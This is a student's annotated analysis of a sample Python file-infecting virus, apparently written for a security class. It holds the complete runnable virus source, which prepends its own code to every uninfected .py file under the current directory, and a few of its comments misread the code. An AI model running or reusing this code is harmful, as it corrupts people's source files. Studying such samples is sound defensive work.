#!/usr/bin/python

# Script Name: Python Malware Analysis (Challenge 14)
# Class Name: Ops 301
# Author Name: Carsten Rossen
# Date of Latest Revision: 3/18/21
# Purpose: This is an analysis of a sample malware virus script. I have added comments explaining what the script does.

# Imports the 'os' and 'datetime' libraries
import os
import datetime

SIGNATURE = "VIRUS"

# This function takes in a file pathway and returns a list of targeted files.
def locate(path):
    files_targeted = []

    # creates a list of all the directories in the specified file path
    filelist = os.listdir(path)

    # for each directory in the list, if the directory is in the path, then the 
    # files_targeted list is extended with the directory. 
    # If the third to last file in the pathway is a python file, then the script will search
    # the file for the word 'VIRUS'. If the file does not contain the word, then the script appends
    # the file to the files_targeted list. 
    for fname in filelist:
        if os.path.isdir(path+"/"+fname):
            files_targeted.extend(locate(path+"/"+fname))
        elif fname[-3:] == ".py":
            infected = False
            for line in open(path+"/"+fname):
                if SIGNATURE in line:
                    infected = True
                    break
            if infected == False:
                files_targeted.append(path+"/"+fname)

    # This function returns the files_targeted list
    return files_targeted

# This function takes in a list of targeted files and adds a string of text to 
# the beginning of each one.
def infect(files_targeted):

    # Opens a file called virus
    virus = open(os.path.abspath(__file__))

    # creates a string of the first 39 lines of the file
    virusstring = ""
    for i,line in enumerate(virus):
        if 0 <= i < 39:
            virusstring += line

    # closes the file
    virus.close

    # for all the files in the files_targeted list, this loop
    # inserts the virus string in the beginning of the file
    for fname in files_targeted:
        f = open(fname)
        temp = f.read()
        f.close()
        f = open(fname,"w")
        f.write(virusstring + temp)
        f.close()

# This function prints "You have been hacked" to the terminal.
def detonate():
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
        print "You have been hacked"

# calls the function 'locate' with a file path as the parameter 
files_targeted = locate(os.path.abspath(""))

# infects the targeted files
infect(files_targeted)

# prints a 'hacked' message
detonate()
